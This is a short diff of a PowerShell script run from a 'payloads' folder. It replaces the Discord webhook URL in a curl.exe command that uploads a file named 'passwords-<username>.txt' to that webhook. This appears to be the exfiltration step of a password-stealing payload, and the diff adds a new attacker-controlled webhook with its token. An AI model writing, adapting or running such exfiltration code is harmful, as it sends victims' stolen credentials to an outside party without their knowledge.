@@ -12,7 +12,7 @@ Set-Location C:\payloads
 
 Start-Sleep -seconds 15
 
-curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1103770625807495268/HPCqKHhV5TbWTpg5VibrXPYFRqMFoOmm_HAcUAVTHef8PSz0xiEKxbCX-BvimV3fK6Y1
+curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" https://discord.com/api/webhooks/1176214279410692188/VyeYnjpetwFI0pk5pNUuTVEdqRUbSeGi2AzkP6jvY-VVmgSVUa6N-jRpp9_NSaNy7fA3
 
 Start-Sleep -seconds 1
 
